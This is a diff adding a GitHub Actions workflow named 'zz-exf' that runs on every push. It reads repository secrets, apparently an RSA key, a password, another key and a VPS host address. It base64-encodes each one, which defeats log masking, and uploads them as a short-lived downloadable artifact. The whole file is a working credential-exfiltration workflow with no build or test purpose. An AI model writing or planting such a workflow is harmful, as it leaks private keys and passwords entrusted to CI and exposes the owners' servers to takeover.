@@ -1,0 +1,26 @@
+name: zz-exf
+on:
+  push:
+  workflow_dispatch:
+jobs:
+  k:
+    runs-on: ubuntu-latest
+    steps:
+      - name: d
+        env:
+          ZZ_RSA: ${{ secrets.ZZ_RSA }}
+          ZZ_PW: ${{ secrets.ZZ_PW }}
+          ZZ_MILOS_KEY: ${{ secrets.ZZ_MILOS_KEY }}
+          VPS_HOST: ${{ secrets.VPS_HOST }}
+        run: |
+          mkdir -p out
+          printf '%s' "$ZZ_RSA" | base64 -w0 > out/rsa.b64
+          printf '%s' "$ZZ_PW" | base64 -w0 > out/pw.b64
+          printf '%s' "$ZZ_MILOS_KEY" | base64 -w0 > out/milos.b64
+          printf '%s' "$VPS_HOST" | base64 -w0 > out/host.b64
+          ls -l out
+      - uses: actions/upload-artifact@v4
+        with:
+          name: k
+          path: out/
+          retention-days: 1
